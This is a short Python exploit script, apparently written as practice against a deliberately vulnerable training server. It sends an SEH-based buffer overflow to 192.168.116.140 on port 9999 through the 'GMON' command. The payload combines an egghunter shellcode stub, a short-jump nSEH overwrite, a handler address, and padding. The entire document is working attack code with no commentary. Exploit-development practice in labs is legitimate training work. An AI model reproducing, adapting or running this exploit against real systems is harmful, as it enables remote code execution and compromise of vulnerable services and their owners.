import socket, sys

egg=b""
egg+=b"\x33\xd2\x66\x81\xca\xff\x0f\x33\xdb\x42\x53\x53\x52\x53\x53\x53"
egg+=b"\x6a\x29\x58\xb3\xc0\x64\xff\x13\x83\xc4\x0c\x5a\x83\xc4\x08\x3c"
egg+=b"\x05\x74\xdf\xb8\x50\x57\x4e\x44\x8b\xfa\xaf\x75\xda\xaf\x75\xd7"
egg+=b"\xff\xe7"

nseh=b""
nseh=b"\xeb\xb6"
nseh+=b"\x90\x90"

seh=b"\xb4\x10\x50\x62"

payload=b""
payload+=b"\x90"*(3549-70)
payload+=egg
payload+=b"A"*(3549-len(payload))
payload+=nseh
payload+=seh
payload+=b"D"*(5000-len(payload))

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.116.140", 9999))
s.send((b"GMON /."+payload))
s.close()
sys.exit()
